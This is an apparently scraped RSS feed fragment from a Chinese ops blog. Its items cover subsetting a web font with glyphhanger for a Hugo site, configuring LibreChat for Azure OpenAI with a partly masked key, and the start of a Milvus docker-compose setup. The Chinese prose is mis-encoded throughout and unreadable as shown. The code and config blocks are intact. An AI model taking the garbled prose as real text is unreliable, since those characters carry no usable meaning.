      <description>&lt;p&gt;ä¸å¾—ä¸æ„Ÿå¹ï¼Œaiæ—¶ä»£çš„å¼ºå¤§ï¼Œåšä¸»çš„æœ¬èŒæ˜¯ä¸€ä¸ªè¿ç»´ï¼Œå¯¹å‰ç«¯å’ŒCSSæ‡‚çš„ä¸å¤šï¼Œç”¨çš„è½¯ä»¶æ˜¯Hugoï¼Œå…¶å®å¯¹è¿™ä¸ªä¹Ÿä¸€çªä¸é€šï¼Œå°±æ˜¯é€‰äº†ä¸€ä¸ªè‡ªå·±çœ‹å¾—é¡ºçœ¼çš„themeï¼Œç„¶åå°±æ˜¯ç”¨æ¥å†™æ–‡ç« ï¼ŒæœŸé—´ä¹Ÿå°è¯•å»åšäº›æ”¹å˜ï¼Œå‡å·²å¤±è´¥å‘Šç»ˆï¼Œä¸»è¦æ˜¯å¯¹hugoã€themeã€cssä¸æ¸…æ¥šï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ”¹ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æœ‰äº†AIçš„åŠ æŒï¼Œè¿™ä¸ªä¸€ç›´ç”¨äº†å¥½å¤šå¹´çš„blogçš„æ ·å­ä¹Ÿçœ‹çƒ¦äº†ï¼Œå‡†å¤‡æ¢æ‰ã€‚&lt;/p&gt;
&lt;p&gt;æ—§çš„ç•Œé¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251213181856750&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251213-blog_renew/image-20251213181856750.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ–°çš„ç•Œé¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251213182225463&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251213-blog_renew/image-20251213182225463.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç”¨äº†geminiï¼ŒèŠ±äº†ä¸€å¤©æ—¶é—´ï¼Œä¸»è¦æ˜¯å«Œå¼ƒåº•éƒ¨çš„å‰ä¸€é¡µã€åä¸€é¡µçœ‹èµ·æ¥æ°¸æ— æ­¢å¢ƒï¼Œäºæ˜¯è®©aiæ“äº†ä¸€ä¸ªåº•éƒ¨å¯¼èˆªæ¡ã€‚ä¹Ÿå®šåˆ¶äº†cssã€‚ç¡®å®æƒŠè‰³ä¸€æª&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251213185955036&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251213-blog_renew/image-20251213185955036.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è¿‡ç¨‹ä¸­å§ï¼Œç”¨åˆ°äº†ä¸€ä¸ªå¼€æºçš„å­—ä½“ï¼šOPPOSans-Regular.ttf ï¼ŒOPPOæ‰‹æœºçš„å­—ä½“ï¼Œè¿™ä¸ªæ–‡ä»¶å±…ç„¶æœ‰9å…†ä¹‹å·¨&lt;/p&gt;
&lt;p&gt;å®ŒçŠŠå­äº†ï¼ŒåŠ è½½å­—ä½“éƒ½è¦èŠ±åŠå¤©æ—¶é—´ï¼Œè¿™ä¹Ÿå¤ªææ€–äº†ï¼Œäºæ˜¯æœä¼˜åŒ–æ–¹æ¡ˆ&lt;/p&gt;
&lt;p&gt;é‚£å°±æ˜¯å‹ç¼©å­—ä½“ï¼ŒæŠŠåšå®¢ä¸­å‡ºç°çš„æ‰€æœ‰å­—æ‰«æä¸€éï¼Œç„¶åç”Ÿæˆå°å­—ä½“æ–‡ä»¶ï¼Œè¿™æ ·å°±å¥½äº†&lt;/p&gt;
&lt;p&gt;é‚£å°±è¦ç”¨åˆ° &lt;code&gt;glyphhanger&lt;/code&gt; äº†&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šè¿™ä¸ªè½¯ä»¶ç”¨èµ·æ¥åŠå…¶éº»çƒ¦ï¼Œä¸€å®šè¦åœ¨Windowsä¸‹è£…ï¼ŒLinuxä¸‹ç®€ç›´æ˜¯åƒåœ¾æˆå †&lt;/p&gt;
&lt;p&gt;æœ¬ä½“æ˜¯ä¸€ä¸ªnodejsçš„è½¯ä»¶ï¼Œç”¨åˆ°äº†pythonçš„fonttoolsï¼Œè¿˜è£…äº†puppyteerè¿›è¡Œç½‘é¡µçš„æŠ“å–ï¼Œç®€ç›´æ˜¯æ‚çƒ©å¤§é›†åˆ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¦å‹ç¼©æˆwoff2ï¼Œæ‰€ä»¥è¦è£…pythonçš„2ä¸ªåŒ…&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install -g glyphhanger
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install fonttools
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install brotli
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ‰“å¼€hugoçš„é¢„è§ˆï¼Œhttp://localhost:1313/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hugo serve
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å½“å‰ç›®å½•ä¸‹çš„OPPOSans-Regular.ttfï¼Œç”Ÿæˆå‹ç¼©è¿‡çš„å­—ä½“æ–‡ä»¶ï¼Œæ ¼å¼æ˜¯woff2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;glyphhanger --subset OPPOSans-Regular.ttf --formats&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;woff2 --output ./ http://localhost:1313/posts/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20251213184318813&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251213-blog_renew/image-20251213184318813.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ttfçš„å®Œæ•´å­—ä½“ç»è¿‡å‹ç¼©æˆwoff2ï¼Œä»9å…†å˜æˆäº†4.52å…†ï¼Œç„¶åæ‰«æç½‘é¡µååˆå‹ç¼©åˆ°äº†æœ€ç»ˆçš„75.5KB.&lt;/p&gt;
&lt;p&gt;è¿™ä¼šç”Ÿæˆä¸€ä¸ª&lt;code&gt;OPPOSans-Regular-subset.woff2&lt;/code&gt;çš„æ–°å­—ä½“æ–‡ä»¶ï¼Œ75.5KB&lt;/p&gt;
&lt;p&gt;æ²¡å®Œå‘¢ï¼Œæˆ‘ä»¬è¿˜è¦åœ¨CSSé‡ŒæŒ‡å®šå­—ä½“èŒƒå›´&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‹ç¼©å­—ä½“æ–‡ä»¶ï¼ŒåŒæ—¶ç”ŸæˆCSSæ ·å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;glyphhanger --css --subset fonts/OPPOSans-Regular.woff2 --formats&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;woff2 --output newfonts http://localhost:1313/posts/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¼šç”ŸæˆCSSæ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¾è¿›å®šåˆ¶çš„custom.cssä¸­å³å¯&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251213185802356&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251213-blog_renew/image-20251213185802356.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@font-face &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  font-family: OPPO Sans&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  src: local&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;OPPO Sans&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       url&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OPPOSans-Regular-subset.woff2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; format&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;woff2&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  unicode-range: U+A,U+20-3E,U+40-7D,U+A9,U+B7,U+BB,U+2013,U+25BA,U+2705,U+3001,U+3002,U+4E00,U+4E09-4E0B,U+4E0D,U+4E14,U+4E1A,U+4E1C,U+4E24,U+4E2A,U+4E2D,U+4E34,U+4E3A,U+4E3B,U+4E48,U+4E49,U+4E4B,U+4E4E,U+4E50,U+4E5F,U+4E66,U+4E71,U+4E86,U+4E89,U+4E8B,U+4E8C,U+4E8E,U+4E94,U+4E9B,U+4EA6,U+4EA7,U+4EAB,U+4EBA,U+4ECA,U+4ECE,U+4ED3,U+4EE3-4EE5,U+4EEC,U+4EF6,U+4EFB,U+4EFD,U+4F01,U+4F1A,U+4F20,U+4F3C,U+4F46,U+4F53,U+4F55,U+4F59,U+4F5C,U+4F60,U+4F73,U+4F7F,U+4FBF,U+4FDD,U+4FE1,U+4FEE,U+5019,U+503C,U+5047,U+504F,U+505A,U+50CF,U+513F,U+5143,U+5148,U+5165,U+5168,U+516B,U+516C,U+5171,U+5173,U+5176,U+5177,U+517C,U+5185,U+518D,U+5197,U+5199,U+51B3,U+51B5,U+51C0,U+51C6,U+51FA,U+51FB,U+51FD,U+5206,U+5212,U+5219-521B,U+521D,U+5220,U+522B,U+5230,U+524D,U+526F,U+529E-52A1,U+52A8,U+52B2,U+5305,U+5316,U+5355,U+535A,U+5360,U+5361,U+5373,U+5386,U+53BB,U+53C2,U+53C8,U+53CA,U+53D1,U+53D6,U+53D8,U+53E3,U+53E4,U+53EA,U+53EF,U+53F0,U+53F7,U+53F8,U+5404,U+540C-540E,U+5411,U+5426,U+5427,U+542F,U+544A,U+5462,U+547D,U+548C,U+54EA,U+554A,U+5565,U+5668,U+56DB,U+56DE,U+56E0,U+56E7,U+56FD,U+56FE,U+5728,U+5730,U+573A,U+5740,U+5757,U+578B,U+57DF,U+585E,U+5883,U+589E,U+5904,U+5907,U+590D,U+5916,U+591A,U+5927,U+5929,U+592A,U+5931,U+5948,U+597D,U+5982,U+59CB,U+5B50,U+5B57,U+5B58,U+5B83,U+5B89,U+5B8C,U+5B98,U+5B9A,U+5B9E,U+5BA2,U+5BB6,U+5BB9,U+5BBD,U+5BC6,U+5BCC,U+5BF9,U+5BFC,U+5C01,U+5C06,U+5C31,U+5C3D,U+5C45,U+5DDE,U+5DF1,U+5DF2,U+5E02,U+5E03,U+5E38,U+5E72-5E74,U+5E76,U+5E78,U+5E7F,U+5E8F,U+5E93,U+5E94,U+5EFA,U+5F00,U+5F04,U+5F0F,U+5F20,U+5F31,U+5F39,U+5F52,U+5F53,U+5F55,U+5F85,U+5F88,U+5F97,U+5FAA,U+5FC3,U+5FC5,U+5FD7,U+5FEB,U+6000,U+6001,U+600E,U+601D,U+6027,U+603B,U+6062,U+606F,U+6089,U+60A8,U+60C5,U+60F3,U+6109,U+610F,U+613F,U+6210-6212,U+6216,U+6237,U+623F,U+6240,U+624B,U+624D,U+6253,U+6254,U+6258,U+6267,U+6269,U+627E,U+6280,U+628A,U+62A5,U+62C9,U+62DF,U+62E9,U+62EC,U+62FF,U+6301,U+6307,U+6309,U+636E,U+6377,U+6389,U+6392,U+63A5,U+63A8,U+641C,U+642D,U+6446,U+6447,U+64CD,U+652F,U+6539,U+653E,U+6545,U+6570,U+6574,U+6587,U+65AD,U+65B0,U+65B9,U+65E0,U+65E5,U+65E9,U+65F6,U+660E,U+6613,U+662F,U+663E,U+666F,U+66B4,U+66F4,U+6700,U+6708,U+6709,U+670D,U+671F,U+672A,U+672C,U+672F,U+673A,U+6743,U+6765,U+677E,U+677F,U+6790,U+679C,U+67D0,U+67E5,U+6807,U+6837-6839,U+683C,U+6848,U+6863,U+68AD,U+68C0,U+6A21,U+6B21,U+6B4C,U+6B62,U+6B63,U+6B65,U+6B7B,U+6BB5,U+6BCF,U+6BD4,U+6C42,U+6C89,U+6CA1,U+6CD5,U+6CE8,U+6D3B,U+6D4B,U+6D88,U+6DFB,U+6E05,U+6E90,U+6EE5,U+6F0F,U+706B,U+70B9,U+70C2,U+70E6,U+7130,U+7136,U+7167,U+719F,U+723D,U+7248,U+7279,U+72B6,U+72EC,U+73A9,U+73AF,U+73B0,U+7406,U+751F,U+7528,U+7531,U+754C,U+7591,U+7684,U+76D6,U+76EE,U+76F4,U+76F8,U+7701,U+770B,U+771F,U+77E5,U+77ED,U+7801,U+7814,U+786E,U+793A,U+79BB,U+79CD,U+79D2,U+79DF,U+79F0,U+79FB,U+7A00,U+7A0B,U+7A76,U+7A7A,U+7ACB,U+7AD9,U+7ADE-7AE0,U+7AEF,U+7B2C,U+7B49,U+7B54,U+7B7E,U+7B80,U+7B97,U+7BA1,U+7C7B,U+7CFB,U+7D22,U+7E41,U+7EA7,U+7EAF,U+7EC6,U+7ECF,U+7ED3,U+7ED9,U+7EDC,U+7EDF,U+7EED,U+7F3A,U+7F51,U+7F6E,U+7F72,U+7FA4,U+8003,U+8005,U+800C,U+800D,U+8017,U+804C,U+8054,U+80AF,U+80CC,U+80FD,U+8106,U+8111,U+811A,U+817E,U+81EA,U+81F4,U+8272,U+8282,U+8350,U+83B7,U+83DC,U+85CF,U+8651,U+865A,U+884C,U+88AB,U+88C2,U+88C5,U+88D5,U+897F,U+8981,U+8986,U+89C9,U+89D2,U+89E3,U+8A00,U+8B66,U+8BA1,U+8BA2,U+8BAF,U+8BB2,U+8BBA,U+8BBE,U+8BBF,U+8BC1,U+8BD5,U+8BDD,U+8BE2,U+8BE5,U+8BE6,U+8BED,U+8BEF,U+8BF4,U+8BF7,U+8C03,U+8C37,U+8C61,U+8D25,U+8D44,U+8D70,U+8D77,U+8DD1,U+8DDF,U+8DEF,U+8DF3,U+8DF5,U+8F7B,U+8F7D,U+8F83,U+8F93,U+8FC1,U+8FC7,U+8FD0,U+8FD4,U+8FD8,U+8FD9,U+8FDB,U+8FDE,U+9000-9002,U+9009,U+901A,U+903C,U+9047,U+904D,U+9053,U+9075,U+90A3,U+90E8,U+90FD,U+914D,U+91CA,U+91CC,U+91CD,U+91CF,U+94FE,U+9501,U+9519,U+952E,U+955C,U+957F,U+95EE,U+95F4,U+9632,U+963B,U+9645,U+964B,U+9650,U+9664,U+968F,U+9690,U+969C,U+96BE,U+96C6,U+9700,U+975E,U+9762,U+9875,U+9876,U+987B,U+9884,U+9891,U+9898,U+9996,U+9AA4,U+9AD8,U+9EBB,U+FF01,U+FF0C,U+FF1A,U+FF1F&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  font-style: normal&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  font-display: swap&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  font-weight: &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt; 700&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠŠå‹ç¼©åçš„å­—ä½“å’ŒCSSå†æ¬¡æäº¤ååšå®¢çš„é€Ÿåº¦å°±å˜å¾—é£å¿«äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>LibreChatå¦‚ä½•é…ç½®æ¥å…¥Azure</title>
      <link>https://rendoumi.com/posts/20251210-librechat_azure/</link>
      <pubDate>Wed, 10 Dec 2025 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251210-librechat_azure/</guid>
      <description>&lt;p&gt;Aiçš„æ—¶ä»£å·²ç»æ¥ä¸´ï¼Œç°åœ¨ä¸»ç”¨çš„æ˜¯è°·æ­Œçš„antigravityï¼Œç„¶åå¹³æ—¶å¯¹è¯è¯¢é—®ï¼Œç”¨çš„æ˜¯LibreChatï¼Œç»™ä¸ªé“¾æ¥&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/danny-avila/LibreChat&#34;&gt;https://github.com/danny-avila/LibreChat&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿™ä¸ªä¸œè¥¿å§ï¼Œé…èµ·æ¥æ²¡é‚£ä¹ˆç®€å•ï¼Œè¿˜æ˜¯ docker compose çš„éƒ¨ç½²æ–¹æ³•å¿«æ·&lt;/p&gt;
&lt;p&gt;é‚£æœ‰openrouterçš„apiï¼Œè¿™ä¸ªæ¥å…¥ç®€å•ã€‚é‚£åŒæ—¶ä¹‹å‰è¿˜æœ‰ç”¨Azure gpt-4oçš„apiï¼Œç”¨çš„æ˜¯Javisï¼Œç›´æ¥æ¥å…¥Azure&lt;/p&gt;
&lt;p&gt;Javisåå¼±ï¼Œç°åœ¨æƒ³ç»Ÿä¸€ç”¨åˆ°LibreChatï¼Œæ¥å…¥è¿˜çœŸçš„æ˜¯ä¸€è¨€éš¾å°½&lt;/p&gt;
&lt;p&gt;æ¥è¯¦ç»†è¯´è¯´Azureçš„é…æ³•ï¼ŒèƒŒæ™¯ï¼šAzureæ˜¯åŒäº‹åœ¨2024å¹´å¼€çš„ï¼Œåªç»™äº†æˆ‘ä¸‰ä¸ªå‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AZURE_OPENAI_API_BASE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://pppqqq-eus.openai.azure.com/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;OPENAI_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AZURE_OPENAI_DEPLOYMENT_NAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;gpt-4o-abc&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå‘¢ï¼ŒåŒäº‹è¿˜ç¦»èŒäº†ï¼Œç„¶åå…¶å®ƒå‚æ•°å°±éƒ½é—®ä¸åˆ°äº†&lt;/p&gt;
&lt;p&gt;LibreChatå‘¢ï¼Œæ–‡æ¡£ç®€ç›´ç¨€çƒ‚ï¼Œè€Œä¸”å˜åŠ¨è¿˜ç‰¹åˆ«å¤§&lt;/p&gt;
&lt;p&gt;LibreChatä¸»è¦çš„æ€è·¯å‘¢ï¼Œå°±æ˜¯åœ¨.envä¸­å®šä¹‰å˜é‡ï¼Œç„¶ååœ¨librechat.yamlä¸­ä½¿ç”¨å˜é‡ï¼Œæˆ‘ä»¬å°±çœäº†ï¼Œéƒ½æ‰”åˆ°librechat.yamlä¸­å¥½äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;endpoints:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  azureOpenAI:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    titleModel: &lt;span class=&#34;s2&#34;&gt;&amp;#34;gpt-4o&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    plugins: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    groups:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - group: &lt;span class=&#34;s2&#34;&gt;&amp;#34;azure&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        apiKey: &lt;span class=&#34;s2&#34;&gt;&amp;#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        instanceName: &lt;span class=&#34;s2&#34;&gt;&amp;#34;pppqqq-eus&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2024-05-01-preview&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# æ¨èä½¿ç”¨æ–°ç‰ˆAPIï¼Œä»¥æ”¯æŒGPT-4o&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# --- Model-Level Mapping (é‡ç‚¹) ---&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        models:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;c1&#34;&gt;# LibreChatæ˜¾ç¤ºçš„åç§°: å®é™…Azureéƒ¨ç½²çš„åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          gpt-4o: &lt;span class=&#34;c1&#34;&gt;# &amp;lt;--- è¿™ä¸ªåç§°ä¼šæ˜¾ç¤ºåœ¨LibreChatçš„ä¸‹æ‹‰èœå•ä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            deploymentName: &lt;span class=&#34;s2&#34;&gt;&amp;#34;gpt-4o-abc&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# &amp;lt;--- æ‚¨çš„å®é™…Azureéƒ¨ç½²åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2024-05-01-preview&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# å¯è¦†ç›–groupçš„version&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          gpt-4-turbo-2024-04-09: &lt;span class=&#34;c1&#34;&gt;# LibreChatæ˜¾ç¤ºçš„åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            deploymentName: &lt;span class=&#34;s2&#34;&gt;&amp;#34;gpt-4o-abc&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# æ‚¨çš„å®é™…Azureéƒ¨ç½²åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2024-02-15-preview&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢çš„é…ç½®æ˜¯é—®äº†geminiç»™å‡ºçš„ï¼Œçœ‹å¾—å‡ºæ¥å˜é‡AZURE_OPENAI_API_BASEä¸­çš„xxx.openai.azure.comå‰é¢çš„xxxï¼Œå°±æ˜¯instanceName&lt;/p&gt;
&lt;p&gt;OPENAI_API_KEYå°±æ˜¯apiKey&lt;/p&gt;
&lt;p&gt;AZURE_OPENAI_DEPLOYMENT_NAMEå°±æ˜¯deploymentName&lt;/p&gt;
&lt;p&gt;æ¨¡å‹çš„gpt-4oè¿˜æœ‰gpt-4-turbo-2024-04-09éƒ½æ˜¯geiminiç»™å‡ºçš„ï¼Œversionä¹Ÿå¾ˆé‡è¦ï¼Œä¸å¯¹ä¼šæŠ¥é”™&lt;/p&gt;
&lt;p&gt;ç„¶åå°±å¯ä»¥äº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>Milvusç”Ÿäº§ç¯å¢ƒæ­å»º</title>
      <link>https://rendoumi.com/posts/20251203-milvus_install/</link>
      <pubDate>Wed, 03 Dec 2025 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251203-milvus_install/</guid>
      <description>&lt;p&gt;Milvus æ˜¯ä¸ªå‘é‡æ•°æ®åº“ï¼Œå¯ä»¥åœ¨kubernetesé‡Œæ­å»ºï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å‡ºæ¥æ­å»º&lt;/p&gt;
&lt;p&gt;helmçš„æ–¹å¼å…ˆä¸è¯´ï¼Œç”¨docker-composeç‹¬ç«‹æ­å»ºçš„æ—¶å€™ï¼Œå±…ç„¶è‡ªå·±è·‘äº†etcdå’Œminioï¼Œè¿˜å¤§æ‘‡å¤§æ‘†çš„æŠŠminioç»™æš´æ¼äº†å‡ºæ¥ï¼Œminioçš„å¯†ç å¤ªç®€é™‹äº†ï¼Œæ”¾åœ¨ç”Ÿäº§æ˜¯è‚¯å®šä¸è¡Œçš„ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ç”Ÿäº§æ­å»ºçš„å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼Œå¯ä»¥æŠŠminioçš„9091ç«¯å£ä¹Ÿç»™å–æ¶ˆäº†ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€å‡†å¤‡å¥½docker-compose.ymlæ–‡ä»¶&lt;/p&gt;
